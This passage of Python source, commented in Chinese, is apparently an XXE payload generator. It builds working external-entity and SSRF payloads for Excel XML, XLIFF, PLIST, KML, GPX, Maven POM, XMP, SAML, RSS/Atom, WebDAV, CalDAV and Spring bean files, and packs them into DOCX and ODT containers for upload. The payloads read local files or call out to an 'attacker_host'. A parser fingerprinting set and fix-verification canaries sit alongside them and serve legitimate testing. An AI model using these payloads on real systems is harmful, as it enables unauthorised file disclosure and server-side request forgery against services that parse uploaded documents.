            "name": "excel2003_xml_spreadsheet_xxe",
            "payload": f'''<?xml version="1.0" encoding="UTF-8"?>
<?mso-application progid="Excel.Sheet"?>
<!DOCTYPE Workbook [
  <!ENTITY xxe SYSTEM "{f_uri}">
]>
<Workbook xmlns="urn:schemas-microsoft-com:office:spreadsheet"
          xmlns:ss="urn:schemas-microsoft-com:office:spreadsheet">
  <Worksheet ss:Name="Sheet1">
    <Table>
      <Row><Cell><Data ss:Type="String">&xxe;</Data></Cell></Row>
    </Table>
  </Worksheet>
</Workbook>''',
            "technique": "Excel 2003 XML Spreadsheet XXE",
            "description": "单文件 XML 格式的 Excel, 扩展名常为 .xml, 易被校验逻辑误判。",
            "content_type": "application/vnd.ms-excel",
            "file_ext": ".xml",
            "requirements": ["按 Excel XML 导入", "允许实体"],
        }, ["Excel 导入功能", "报表上传"]))

        # XLIFF
        results.append(self._attach_component({
            "name": "xliff_xxe",
            "payload": f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xliff [
  <!ENTITY xxe SYSTEM "{f_uri}">
]>
<xliff version="1.2">
  <file source-language="en" target-language="zh" datatype="plaintext" original="test">
    <body>
      <trans-unit id="1">
        <source>&xxe;</source>
        <target>&xxe;</target>
      </trans-unit>
    </body>
  </file>
</xliff>''',
            "technique": "XLIFF XXE",
            "content_type": "application/x-xliff+xml",
            "file_ext": ".xlf",
            "requirements": ["i18n 文件导入", "允许实体"],
        }, ["翻译管理平台", "CMS 多语言导入"]))

        # Apple PLIST
        results.append(self._attach_component({
            "name": "plist_xxe",
            "payload": f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist [
  <!ENTITY xxe SYSTEM "{f_uri}">
]>
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>&xxe;</string>
</dict>
</plist>''',
            "technique": "PLIST XXE",
            "file_ext": ".plist",
            "requirements": ["解析 plist", "允许实体"],
        }, ["iOS/macOS 描述文件上传", "移动设备管理 MDM"]))

        # KML
        results.append(self._attach_component({
            "name": "kml_xxe",
            "payload": f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE kml [
  <!ENTITY xxe SYSTEM "{f_uri}">
]>
<kml xmlns="http://www.opengis.net/kml/2.2">
  <Placemark>
    <name>&xxe;</name>
    <Point><coordinates>0,0,0</coordinates></Point>
  </Placemark>
</kml>''',
            "technique": "KML XXE",
            "content_type": "application/vnd.google-earth.kml+xml",
            "file_ext": ".kml",
            "requirements": ["地图数据导入", "允许实体"],
        }, ["GIS 平台", "轨迹/图层导入"]))

        # GPX
        results.append(self._attach_component({
            "name": "gpx_xxe",
            "payload": f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE gpx [
  <!ENTITY xxe SYSTEM "{f_uri}">
]>
<gpx version="1.1" creator="xxe-test">
  <wpt lat="0" lon="0"><name>&xxe;</name></wpt>
</gpx>''',
            "technique": "GPX XXE",
            "content_type": "application/gpx+xml",
            "file_ext": ".gpx",
            "requirements": ["轨迹导入", "允许实体"],
        }, ["运动/物流轨迹平台"]))

        # Maven POM —— 供应链扫描/依赖分析平台
        results.append(self._attach_component({
            "name": "maven_pom_xxe",
            "payload": f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE project [
  <!ENTITY xxe SYSTEM "{f_uri}">
]>
<project xmlns="http://maven.apache.org/POM/4.0.0">
  <modelVersion>4.0.0</modelVersion>
  <groupId>test</groupId>
  <artifactId>&xxe;</artifactId>
  <version>1.0</version>
</project>''',
            "technique": "Maven POM XXE",
            "file_ext": ".xml",
            "requirements": ["依赖扫描平台解析 pom", "允许实体"],
        }, ["SCA/依赖扫描平台", "CI 构件上传"]))

        # XMP 纯 XML (直接投递, 不嵌图片)
        results.append(self._attach_component({
            "name": "xmp_standalone_xxe",
            "payload": f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE x:xmpmeta [
  <!ENTITY xxe SYSTEM "{f_uri}">
]>
<x:xmpmeta xmlns:x="adobe:ns:meta/">
  <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
           xmlns:dc="http://purl.org/dc/elements/1.1/">
    <rdf:Description rdf:about="">
      <dc:title>&xxe;</dc:title>
    </rdf:Description>
  </rdf:RDF>
</x:xmpmeta>''',
            "technique": "Standalone XMP XXE",
            "content_type": "application/rdf+xml",
            "file_ext": ".xmp",
            "requirements": ["解析独立 XMP sidecar", "允许实体"],
        }, ["媒体资产管理 DAM", "照片工作流系统"]))

        return results

    # ------------------------------------------------------------------
    # SAML / RSS / WebDAV / Spring (保留 v1, 接入 benign)
    # ------------------------------------------------------------------

    def generate_saml_payloads(self) -> List[Dict]:
        f_uri = self._read_uri("saml")
        s_uri = self._ssrf_uri("saml")

        saml_response = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE samlp:Response [
  <!ENTITY xxe SYSTEM "{f_uri}">
]>
<samlp:Response
    xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
    ID="_xxe_test" Version="2.0" IssueInstant="2024-01-01T00:00:00Z">
  <saml:Issuer>xxe-test-idp</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <saml:Assertion ID="_assertion_xxe" Version="2.0" IssueInstant="2024-01-01T00:00:00Z">
    <saml:Issuer>xxe-test-idp</saml:Issuer>
    <saml:Subject><saml:NameID>&xxe;</saml:NameID></saml:Subject>
  </saml:Assertion>
</samlp:Response>'''

        encoded = base64.b64encode(saml_response.encode("utf-8")).decode("ascii")

        return [
            self._attach_component({
                "name": "saml_response_xxe_file_entity",
                "payload": saml_response,
                "technique": "SAML XXE",
                "content_type": "application/xml",
                "file_ext": ".xml",
                "requirements": ["SAML 解析器允许 DOCTYPE", "签名校验前解析实体"],
            }, ["SP 断言消费端 ACS", "身份网关"]),
            self._attach_component({
                "name": "saml_response_base64_post_body",
                "payload": f"SAMLResponse={quote(encoded)}",
                "raw_xml": saml_response,
                "base64_saml": encoded,
                "technique": "SAML Base64 POST Binding",
                "content_type": "application/x-www-form-urlencoded",
                "file_ext": ".txt",
                "requirements": ["HTTP-POST Binding", "接收 SAMLResponse 参数"],
            }, ["SP ACS endpoint"]),
            self._attach_component({
                "name": "saml_schema_location_ssrf",
                "payload": f'''<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response
    xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="urn:oasis:names:tc:SAML:2.0:protocol {s_uri}"
    ID="_schema_ssrf" Version="2.0" IssueInstant="2024-01-01T00:00:00Z">
  <saml:Issuer>schema-ssrf-test</saml:Issuer>
</samlp:Response>''',
                "technique": "SAML SchemaLocation SSRF",
                "content_type": "application/xml",
                "file_ext": ".xml",
                "requirements": ["启用 Schema 验证", "允许远程 XSD"],
            }, ["开启严格校验的 SAML 栈"]),
        ]

    def generate_rss_atom_payloads(self) -> List[Dict]:
        f_uri = self._read_uri("feed")
        s_uri = self._ssrf_uri("feed")
        comp = ["Feed 聚合器", "CMS 外部源导入", "新闻采集管道"]

        return [
            self._attach_component({
                "name": "rss2_xxe_file_entity",
                "payload": f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rss [
  <!ENTITY xxe SYSTEM "{f_uri}">
]>
<rss version="2.0">
  <channel>
    <title>XXE RSS Test</title>
    <link>http://example.com/</link>
    <description>&xxe;</description>
    <item><title>Item</title><description>&xxe;</description></item>
  </channel>
</rss>''',
                "technique": "RSS XXE",
                "content_type": "application/rss+xml",
                "file_ext": ".xml",
                "requirements": ["解析外部 RSS", "允许实体"],
            }, comp),
            self._attach_component({
                "name": "atom_xxe_file_entity",
                "payload": f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE feed [
  <!ENTITY xxe SYSTEM "{f_uri}">
]>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>XXE Atom Test</title>
  <id>urn:xxe:test</id>
  <updated>2024-01-01T00:00:00Z</updated>
  <entry>
    <title>Entry</title><id>urn:xxe:entry</id>
    <updated>2024-01-01T00:00:00Z</updated>
    <content>&xxe;</content>
  </entry>
</feed>''',
                "technique": "Atom XXE",
                "content_type": "application/atom+xml",
                "file_ext": ".xml",
                "requirements": ["解析 Atom", "允许实体"],
            }, comp),
            self._attach_component({
                "name": "rss2_blind_ssrf_parameter_entity",
                "payload": f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rss [
  <!ENTITY % ssrf SYSTEM "{s_uri}">
  %ssrf;
]>
<rss version="2.0">
  <channel><title>RSS SSRF Test</title><description>blind ssrf</description></channel>
</rss>''',
                "technique": "RSS Blind SSRF",
                "content_type": "application/rss+xml",
                "file_ext": ".xml",
                "requirements": ["允许参数实体", "允许外联"],
            }, comp),
        ]

    def generate_webdav_payloads(self) -> List[Dict]:
        f_uri = self._read_uri("dav")
        s_uri = self._ssrf_uri("dav")
        comp = ["WebDAV 服务器", "CalDAV/CardDAV", "云盘系统"]

        return [
            self._attach_component({
                "name": "webdav_propfind_xxe_file_entity",
                "payload": f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE d:propfind [
  <!ENTITY xxe SYSTEM "{f_uri}">
]>
<d:propfind xmlns:d="DAV:">
  <d:prop><d:displayname>&xxe;</d:displayname></d:prop>
</d:propfind>''',
                "technique": "WebDAV PROPFIND XXE",
                "method": "PROPFIND",
                "content_type": "application/xml; charset=utf-8",
                "headers": {"Content-Type": "application/xml; charset=utf-8", "Depth": "1"},
                "file_ext": ".xml",
                "requirements": ["支持 PROPFIND", "允许实体"],
            }, comp),
            self._attach_component({
                "name": "caldav_report_xxe_file_entity",
                "payload": f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE c:calendar-query [
  <!ENTITY xxe SYSTEM "{f_uri}">
]>
<c:calendar-query xmlns:d="DAV:" xmlns:c="urn:ietf:params:xml:ns:caldav">
  <d:prop><d:displayname>&xxe;</d:displayname></d:prop>
  <c:filter><c:comp-filter name="VCALENDAR"/></c:filter>
</c:calendar-query>''',
                "technique": "CalDAV REPORT XXE",
                "method": "REPORT",
                "content_type": "application/xml; charset=utf-8",
                "headers": {"Content-Type": "application/xml; charset=utf-8", "Depth": "1"},
                "file_ext": ".xml",
                "requirements": ["支持 CalDAV REPORT", "允许实体"],
            }, comp),
            self._attach_component({
                "name": "webdav_propfind_blind_ssrf",
                "payload": f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE d:propfind [
  <!ENTITY % ssrf SYSTEM "{s_uri}">
  %ssrf;
]>
<d:propfind xmlns:d="DAV:"><d:allprop/></d:propfind>''',
                "technique": "WebDAV Blind SSRF",
                "method": "PROPFIND",
                "content_type": "application/xml; charset=utf-8",
                "headers": {"Content-Type": "application/xml; charset=utf-8", "Depth": "1"},
                "file_ext": ".xml",
                "requirements": ["允许参数实体外联"],
            }, comp),
        ]

    def generate_spring_xml_payloads(self) -> List[Dict]:
        f_uri = self._read_uri("spring")
        s_uri = self._ssrf_uri("spring")
        comp = ["动态加载 XML Bean 配置的老系统", "插件化平台"]

        return [
            self._attach_component({
                "name": "spring_beans_xxe_file_entity",
                "payload": f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE beans [
  <!ENTITY xxe SYSTEM "{f_uri}">
]>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <bean id="xxeTest" class="java.lang.String">
    <constructor-arg value="&xxe;"/>
  </bean>
</beans>''',
                "technique": "Spring XML XXE",
                "file_ext": ".xml",
                "requirements": ["加载用户可控 Spring XML", "允许实体"],
            }, comp),
            self._attach_component({
                "name": "spring_beans_schema_location_ssrf",
                "payload": f'''<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans {s_uri}">
  <bean id="schemaTest" class="java.lang.String">
    <constructor-arg value="schema_ssrf"/>
  </bean>
</beans>''',
                "technique": "Spring XML SchemaLocation SSRF",
                "file_ext": ".xml",
                "requirements": ["启用 Schema 解析", "允许远程 XSD"],
            }, comp),
            self._attach_component({
                "name": "spring_beans_xinclude_file_read",
                "payload": f'''<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xi="http://www.w3.org/2001/XInclude">
  <bean id="xincludeTest" class="java.lang.String">
    <constructor-arg>
      <value><xi:include parse="text" href="{f_uri}"/></value>
    </constructor-arg>
  </bean>
</beans>''',
                "technique": "Spring XML XInclude",
                "file_ext": ".xml",
                "requirements": ["底层解析器启用 XInclude"],
            }, comp),
        ]

    # ------------------------------------------------------------------
    # Parser Fingerprinting (新增, 天然无害)
    # ------------------------------------------------------------------

    def generate_fingerprint_payloads(self) -> List[Dict]:
        """
        解析器指纹识别。不含任何 file:// 或外联地址, 天然无害。

        原理:
            通过观察目标对不同 XML 特性的响应差异(错误信息/状态码/耗时),
            推断解析器安全配置, 从而决定后续该投哪类 Payload:

            1. doctype_probe       —— DOCTYPE 声明是否被接受
            2. internal_entity     —— 内部实体是否被展开 (无外部访问)
            3. external_entity_local —— 外部实体是否被解析 (指向不存在的 file, 仅看报错差异)
            4. param_entity_probe  —— 参数实体是否被处理 (内部 DTD 子集内)
            5. xinclude_probe      —— XInclude 是否启用 (引用不存在文件看报错)
            6. xsd_probe           —— schemaLocation 是否被处理 (本地不存在路径)
            7. billion_laughs_tiny —— 极小实体扩展, 判断是否有扩展限制/超时保护

        判读速查:
            - doctype 报 "DOCTYPE is disallowed" → Java SaxParseException 风格, 已加固
            - 报实体未定义 vs 报协议被禁 → 区分 "禁外部实体" 与 "禁整个 DTD"
            - xinclude 报文件不存在 → XInclude 处于开启状态, 存在风险
            - 全部静默接受且正常返回 → 高度可疑, 进入 canary 阶段确认
        """
        results = []

        results.append(self._attach_component({
            "name": "fp_doctype_probe",
            "payload": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ELEMENT root (#PCDATA)>
]>
<root>doctype_probe</root>''',
            "technique": "Fingerprint: DOCTYPE Acceptance",
            "description": "仅声明 DTD, 无实体无外部引用。被拒绝说明 disallow-doctype-decl 已开启。",
            "benign": True,
            "file_ext": ".xml",
            "interpretation": {
                "rejected": "DOCTYPE 被禁 → 大部分 XXE 直接免疫, 转测 XInclude/Schema",
                "accepted": "继续 fp_internal_entity 判断实体处理策略",
            },
        }, ["任意 XML 端点 (第一阶段探测)"]))

        results.append(self._attach_component({
            "name": "fp_internal_entity",
            "payload": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY greeting "FINGERPRINT_OK">
]>
<root>&greeting;</root>''',
            "technique": "Fingerprint: Internal Entity Expansion",
            "description": "纯内部实体。若回显 FINGERPRINT_OK 说明实体被展开; 若报未定义说明实体解析被禁。",
            "benign": True,
            "file_ext": ".xml",
            "interpretation": {
                "expanded": "实体机制工作正常 → 外部实体很可能也可用, 进入 canary 确认",
                "undefined_error": "实体不展开 → 可能是 nonvalidating 或已加固",
            },
        }, ["任意 XML 端点 (第一阶段探测)"]))

        results.append(self._attach_component({
            "name": "fp_external_entity_local",
            "payload": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY ext SYSTEM "file:///definitely_not_exists_xxe_fp_9f8e7d">
]>
<root>&ext;</root>''',
            "technique": "Fingerprint: External Entity Resolution",
            "description": "引用必然不存在的本地文件。报 'file not found/IO error' 说明外部实体解析是开启的; 报 'entity not defined' 或静默空值说明已被禁。",
            "benign": True,
            "file_ext": ".xml",
            "severity_if_vulnerable": "证明外部实体面开放",
            "interpretation": {
                "io_error": "外部实体开启且尝试访问文件系统 → 确认 XXE 风险",
                "undefined_or_empty": "外部实体已禁或被安全包装",
            },
        }, ["任意 XML 端点 (第二阶段探测)"]))

        results.append(self._attach_component({
            "name": "fp_param_entity",
            "payload": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % pe "<!ENTITY inner 'PARAM_OK'>">
  %pe;
]>
<root>&inner;</root>''',
            "technique": "Fingerprint: Parameter Entity",
            "description": "纯内部 DTD 子集内的参数实体, 无外部访问。判断参数实体处理是否开启。",
            "benign": True,
            "file_ext": ".xml",
            "interpretation": {
                "expanded": "参数实体可用 → Local DTD Reuse / Blind SSRF 类 Payload 值得尝试",
                "error": "参数实体被禁",
            },
        }, ["任意 XML 端点 (第二阶段探测)"]))

        results.append(self._attach_component({
            "name": "fp_xinclude_probe",
            "payload": '''<?xml version="1.0" encoding="UTF-8"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///definitely_not_exists_xi_fp_9f8e7d"/>
</root>''',
            "technique": "Fingerprint: XInclude Enabled",
            "description": "引用不存在文件。报 IO/资源错误说明 XInclude 开启 (危险); 报 unknown element 或原样保留说明未启用。",
            "benign": True,
            "file_ext": ".xml",
            "interpretation": {
                "io_error": "XInclude 开启 → 即使禁了 DOCTYPE 也可被读取文件",
                "ignored": "XInclude 未启用",
            },
        }, ["禁 DOCTYPE 的端点 (绕过面探测)"]))

        results.append(self._attach_component({
            "name": "fp_xsd_probe",
            "payload": '''<?xml version="1.0" encoding="UTF-8"?>
<root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
      xsi:noNamespaceSchemaLocation="file:///definitely_not_exists_xsd_fp_9f8e7d.xsd">
  xsd_probe
</root>''',
            "technique": "Fingerprint: Schema Location Processing",
            "description": "指向不存在的本地 XSD。报 schema 加载错误说明 schemaLocation 被处理, 存在 Schema SSRF 面。",
            "benign": True,
            "file_ext": ".xml",
            "interpretation": {
                "schema_load_error": "schemaLocation 被处理 → 尝试远程 XSD SSRF",
                "ignored": "未启用 schema 校验",
            },
        }, ["开启校验的端点 (绕过面探测)"]))

        results.append(self._attach_component({
            "name": "fp_entity_expansion_tiny",
            "payload": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY a "xxxxxxxxxx">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
]>
<root>&c;</root>''',
            "technique": "Fingerprint: Entity Expansion Limit",
            "description": "仅 1000 字符级的小扩展, 用于判断是否存在扩展上限保护, 不是真正的 DoS Payload。",
            "benign": True,
            "file_ext": ".xml",
            "interpretation": {
                "limit_error": "有扩展限制 (如 JDK 的 entityExpansionLimit) → 防护较好",
                "expanded": "无限制 → Billion Laughs 风险面存在",
            },
        }, ["DoS 面评估"]))

        return results

    # ------------------------------------------------------------------
    # 修复验证套件 (新增)
    # ------------------------------------------------------------------

    def generate_verify_fix_suite(self) -> Dict[str, List[Dict]]:
        """
        修复效果验证套件。

        使用方法:
            1. 启动 DTD/Canary 服务器: --serve --port 8080
            2. 把 --attacker-url 指向该服务器 (或 DNS 日志平台)
            3. 生成: --mode verify_fix -a http://your-server:8080 -o ./verify
            4. 将全部探测包依次投递到目标上传/解析入口
            5. 判定标准:
               - 服务器日志【零】回连  → 修复有效
               - 任何一条回连        → 对应类别的解析面仍然开放, 日志中
                                       的 canary 子域名前缀标明是哪个类别

        canary 子域名编码规则:
            fp-doctype-*   DOCTYPE 仍被处理
            fp-param-*     参数实体仍可外联
            fp-xinc-*      XInclude 仍可外联
            fp-schema-*    schemaLocation 仍可外联
            fp-svg-*       SVG 解析链仍可外联
            fp-ooxml-*     Office 解析链仍可外联
            fp-odf-*       ODF 解析链仍可外联
            fp-xmp-*       图片元数据链仍可外联
        """
        host = self.attacker_host
        rid = self.run_id

        def canary(tag: str) -> str:
            return f"http://fp-{tag}-{rid}.{host}/canary"

        suite: Dict[str, List[Dict]] = {"verify_fix": []}

        probes = [
            ("doctype", f'''<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY % p SYSTEM "{canary('doctype')}">%p;]>
<r>verify</r>''', ".xml", "DOCTYPE/参数实体面"),
            ("xinc", f'''<?xml version="1.0"?>
<r xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="{canary('xinc')}"/>
</r>''', ".xml", "XInclude 面"),
            ("schema", f'''<?xml version="1.0"?>
<r xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:noNamespaceSchemaLocation="{canary('schema')}">verify</r>''', ".xml", "SchemaLocation 面"),
            ("svg", f'''<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY % p SYSTEM "{canary('svg')}">%p;]>
<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">
  <text x="1" y="9">verify</text>
</svg>''', ".svg", "SVG 解析链"),
            ("xmp", f'''<?xml version="1.0"?>
<!DOCTYPE rdf:RDF [<!ENTITY % p SYSTEM "{canary('xmp')}">%p;]>
<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
  <rdf:Description rdf:about=""/>
</rdf:RDF>''', ".jpg", "图片 XMP 元数据链"),
        ]

        for tag, body, ext, desc in probes:
            item = {
                "name": f"verify_{tag}",
                "payload": body,
                "technique": "Fix Verification Canary",
                "description": f"验证: {desc}。benign, 仅发起 canary 请求。",
                "benign": True,
                "file_ext": ext,
                "expected_when_fixed": "服务器日志无任何回连",
                "expected_when_vulnerable": f"日志出现 fp-{tag}-{rid} 前缀的回连",
            }
            if ext == ".jpg":
                item["binary_carrier"] = "jpg"
            if ext == ".svg":
                item["content_type"] = "image/svg+xml"
            suite["verify_fix"].append(self._attach_component(item, ["修复后的全部上传/解析入口"]))

        # OOXML 验证包
        suite["verify_fix"].append(self._attach_component({
            "name": "verify_ooxml",
            "payload": f'''<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY % p SYSTEM "{canary('ooxml')}">%p;]>
<root>verify</root>''',
            "technique": "Fix Verification Canary",
            "description": "验证: Office 解析链。封装为 docx 后上传。",
            "benign": True,
            "file_ext": ".docx",
            "ooxml_kind": "docx",
            "ooxml_injection": "customxml",
            "expected_when_fixed": "服务器日志无任何回连",
            "expected_when_vulnerable": f"日志出现 fp-ooxml-{rid} 前缀的回连",
        }, ["修复后的 Office 预览/转换服务"]))

        # ODF 验证包
        suite["verify_fix"].append(self._attach_component({
            "name": "verify_odf",
            "payload": f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE office:document-content [<!ENTITY % p SYSTEM "{canary('odf')}">%p;]>
<office:document-content
    xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0"
    xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0"
    office:version="1.2">
  <office:body><office:text><text:p>verify</text:p></office:text></office:body>
</office:document-content>''',
            "technique": "Fix Verification Canary",
            "description": "验证: ODF/LibreOffice 解析链。封装为 odt 后上传。",
            "benign": True,
            "file_ext": ".odt",
            "odf_kind": "odt",
            "odf_mimetype": "application/vnd.oasis.opendocument.text",
            "odf_injection": "content",
            "expected_when_fixed": "服务器日志无任何回连",
            "expected_when_vulnerable": f"日志出现 fp-odf-{rid} 前缀的回连",
        }, ["修复后的 LibreOffice 转换服务"]))

        return suite

    # ------------------------------------------------------------------
    # 综合生成
    # ------------------------------------------------------------------

    def generate_scenario_payloads(self) -> Dict[str, List[Dict]]:
        return {
            "soap": self.generate_soap_payloads(),
            "svg": self.generate_svg_payloads(),
            "office_ooxml": self.generate_office_payloads(),
            "office_odf": self.generate_odf_payloads(),
            "epub": self.generate_epub_payloads(),
            "xmp_image": self.generate_xmp_image_payloads(),
            "misc_xml": self.generate_misc_xml_payloads(),
            "saml": self.generate_saml_payloads(),
            "rss_atom": self.generate_rss_atom_payloads(),
            "webdav": self.generate_webdav_payloads(),
            "spring_xml": self.generate_spring_xml_payloads(),
        }

    def generate_all_payloads(self) -> Dict[str, List[Dict]]:
        all_p = {
            "basic": [self.generate_basic_file_entity_payload()],
            "local_dtd": self.generate_local_dtd_payload(),
            "error_based": [self.generate_error_based_payload()],
            "blind_ssrf": self.generate_blind_ssrf_payload(),
            "xinclude": self.generate_xinclude_payload(),
            "schema_ssrf": self.generate_schema_ssrf_payload(),
            "fingerprint": self.generate_fingerprint_payloads(),
        }
        all_p.update(self.generate_scenario_payloads())
        return all_p


# ============================================================================
# 第五部分：容器文件构造 (OOXML / ODF / EPUB)
# ============================================================================

def create_ooxml_package(kind: str, xml_payload: str, output_path: str,
                         injection: str = "customxml"):
    """
    生成最小 OOXML 包, 支持多注入点:
        customxml  -> customXml/item1.xml (默认, 数据绑定路径)
        document   -> word/document.xml 正文 (仅 docx, 预览渲染路径)
        coreprops  -> docProps/core.xml 文档属性 (元数据抽取路径)
    """
    kind = kind.lower()
    if kind not in {"docx", "xlsx", "pptx"}:
        raise ValueError(f"Unsupported OOXML kind: {kind}")

    main_part = {
        "docx": ("word/document.xml",
                 "http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument"),
        "xlsx": ("xl/workbook.xml",
                 "http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument"),
        "pptx": ("ppt/presentation.xml",
                 "http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument"),
    }[kind]

    normal_main = {
        "docx": '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body><w:p><w:r><w:t>OOXML test document</w:t></w:r></w:p></w:body>
</w:document>''',
        "xlsx": '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheets/>
</workbook>''',
        "pptx": '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
</p:presentation>''',
    }[kind]

    with zipfile.ZipFile(output_path, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
</Types>''')

        if injection == "document" and kind == "docx":
            # 正文注入: payload 直接作为 document.xml
            z.writestr("_rels/.rels", f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="{main_part[1]}" Target="{main_part[0]}"/>
</Relationships>''')
            z.writestr(main_part[0], xml_payload)

        elif injection == "coreprops":
            # 属性注入: payload 作为 docProps/core.xml
            z.writestr("_rels/.rels", f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="{main_part[1]}" Target="{main_part[0]}"/>
  <Relationship Id="rId2"
    Type="http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties"
    Target="docProps/core.xml"/>
</Relationships>''')
            z.writestr(main_part[0], normal_main)
            z.writestr("docProps/core.xml", xml_payload)

        else:
            # 默认 customXml 注入
            z.writestr("_rels/.rels", f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="{main_part[1]}" Target="{main_part[0]}"/>
  <Relationship Id="rId2"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml"
    Target="customXml/item1.xml"/>
</Relationships>''')
            z.writestr(main_part[0], normal_main)
            z.writestr("customXml/item1.xml", xml_payload)


def create_odf_package(kind: str, xml_payload: str, output_path: str,
                       mimetype: str, injection: str = "content"):
    """
    生成最小 ODF 包。
    注意: ODF 规范要求 mimetype 文件必须是 ZIP 内第一个条目且不压缩。
    injection: content -> content.xml; meta -> meta.xml
    """
    with zipfile.ZipFile(output_path, "w") as z:
        # mimetype 必须第一个且 STORED
        z.writestr(zipfile.ZipInfo("mimetype"), mimetype, compress_type=zipfile.ZIP_STORED)

        z.writestr("META-INF/manifest.xml", f'''<?xml version="1.0" encoding="UTF-8"?>
<manifest:manifest
    xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0"
    manifest:version="1.2">
  <manifest:file-entry manifest:full-path="/" manifest:media-type="{mimetype}"/>
  <manifest:file-entry manifest:full-path="content.xml" manifest:media-type="text/xml"/>
  <manifest:file-entry manifest:full-path="meta.xml" manifest:media-type="text/xml"/>
</manifest:manifest>''')

        normal_content = '''<?xml version="1.0" encoding="UTF-8"?>
<office:document-content
    xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0"
    xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0"
    office:version="1.2">
  <office:body><office:text><text:p>ODF test</text:p></office:text></office:body>
</office:document-content>'''

        normal_meta = '''<?xml version="1.0" encoding="UTF-8"?>
<office:document-meta
    xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0"
    xmlns:dc="http://purl.org/dc/elements/1.1/"
    office:version="1.2">
  <office:meta><dc:title>ODF test</dc:title></office:meta>
</office:document-meta>'''

        if injection == "meta":
            z.writestr("content.xml", normal_content)
            z.writestr("meta.xml", xml_payload)
        else:
            z.writestr("content.xml", xml_payload)
            z.writestr("meta.xml", normal_meta)


def create_epub_package(opf_payload: str, output_path: str):
